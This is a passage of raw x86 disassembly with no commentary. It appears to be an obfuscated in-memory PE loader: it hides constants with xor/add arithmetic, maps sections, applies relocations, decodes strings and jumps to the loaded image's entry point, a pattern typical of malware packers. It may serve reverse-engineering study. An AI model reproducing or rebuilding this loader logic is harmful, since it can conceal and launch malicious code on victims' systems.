  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
